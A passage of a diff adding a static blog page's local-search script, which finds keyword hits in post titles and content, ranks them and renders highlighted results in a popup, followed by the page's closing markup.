+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
